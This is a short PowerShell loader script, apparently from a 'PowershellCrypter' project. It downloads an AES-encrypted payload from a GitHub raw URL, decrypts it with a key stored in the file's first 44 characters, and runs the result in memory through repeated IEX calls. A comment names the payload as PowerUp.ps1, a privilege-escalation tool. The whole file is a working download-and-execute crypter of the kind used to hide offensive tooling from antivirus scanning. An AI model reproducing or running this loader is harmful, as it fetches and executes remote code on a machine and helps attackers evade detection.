#decrypt an already encrypted script(PowerUp.ps1)
$file=(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/DenFox93/PowershellCrypter/main/examples/file1 ');
$i=0
function decrypter($file) {
    $i+=1
    #the AES key is been saved by the encrypter in the first 44 characters of the file
    $key=$file.substring(0,44);
    #exlude the key from the rest of the file
    $bytes=[System.Convert]::FromBase64String($file.substring(44));
    
    $aes = New-Object "System.Security.Cryptography.AesManaged";
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
    $aes.BlockSize = 128;
    $aes.KeySize = 256;
    $IV = $bytes[0..15];
    $aes.IV = $IV;
    $aes.Key = [System.Convert]::FromBase64String($key);
    $decryptor = $aes.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aes.Dispose();
    $backToPlainText=[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);
    #execute
    if($i -le 9){
        IEX(decrypter($backToPlainText));
    }else{
        IEX($backToPlainText)
    }
        
}

decrypter $file

